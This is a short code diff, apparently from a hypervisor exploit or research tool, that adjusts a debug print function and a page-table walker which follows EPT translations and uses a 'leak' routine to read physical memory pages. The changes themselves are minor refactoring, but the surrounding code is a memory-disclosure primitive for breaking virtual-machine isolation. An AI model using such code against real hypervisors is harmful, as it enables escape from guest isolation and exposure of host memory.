@@ -30,9 +30,11 @@ void pr_dub(const char *format, ...)
     va_start(args, format);
     vfprintf(stderr, format, args);
     va_end(args);
+
     va_start(args, format);
     vfprintf(stdout, format, args);
     va_end(args);
+    fflush(stdout);
 }
 
 void set_cpu_affinity(int cpu_id) {
@@ -144,7 +146,7 @@ void dump_page_table_mappings(hpa_t base, hva_t hdm, hpa_t root_page_table, hpa_
         if (!(pgd[i] & 1))
             continue;
         next_page_table = pgd[i] & PFN_MASK;
-        if (eptp) next_page_table = translate(base, next_page_table, eptp, hdm) & PFN_MASK;
+        if (eptp) next_page_table = translate(base, next_page_table, eptp, hdm, NULL) & PFN_MASK;
         leak(&pud, base, next_page_table, 0x1000);
         for (long j = 0x100; j < 0x200; j++) {
             if (!(pud[j] & 1)) {
@@ -165,7 +167,7 @@ void dump_page_table_mappings(hpa_t base, hva_t hdm, hpa_t root_page_table, hpa_
                 continue;
             }
             next_page_table = pud[j] & PFN_MASK;
-            if (eptp) next_page_table = translate(base, next_page_table, eptp, hdm) & PFN_MASK;
+            if (eptp) next_page_table = translate(base, next_page_table, eptp, hdm, NULL) & PFN_MASK;
             leak(&pmd, base, next_page_table, 0x1000);
             for (long k = 0; k < 0x200; k++) {
                 if (!(pmd[k] & 1)) {
@@ -186,7 +188,7 @@ void dump_page_table_mappings(hpa_t base, hva_t hdm, hpa_t root_page_table, hpa_
                     continue;
                 }
                 next_page_table = pmd[k] & PFN_MASK;
-                if (eptp) next_page_table = translate(base, next_page_table, eptp, hdm) & PFN_MASK;
+                if (eptp) next_page_table = translate(base, next_page_table, eptp, hdm, NULL) & PFN_MASK;
                 leak(&pte, base, next_page_table, 0x1000);
                 for (long l = 0; l < 0x200; l++) {
                     if (!(pte[l] & 1)) {
